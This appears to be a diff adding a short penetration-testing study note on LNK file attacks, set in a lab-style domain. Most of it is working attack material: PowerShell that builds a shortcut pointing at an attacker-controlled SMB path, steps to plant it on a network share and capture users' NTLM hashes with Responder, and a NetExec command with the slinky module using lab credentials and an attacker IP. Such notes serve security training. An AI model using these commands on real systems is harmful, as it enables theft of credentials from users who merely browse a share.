@@ -1,0 +1,19 @@
+# LNK File Attacks
+
+- We can use powershell (admin) to create a file:
+    
+    $objShell = New-Object -ComObject WScript.shell
+    $lnk = $objShell.CreateShortcut("C:\test.lnk")
+    $lnk.TargetPath = "\\192.168.138.149\@test.png"
+    $lnk.WindowStyle = 1
+    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+    $lnk.Description = "Test"
+    $lnk.HotKey = "Ctrl+Alt+T"
+    $lnk.Save()
+    
+- We can use responder to catch a hash by anyone who tries to access the file
+- Put it into the Network Share so other users can see it
+
+NetExec
+
+- netexec smb <target_ip> -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=<attacker_ip>
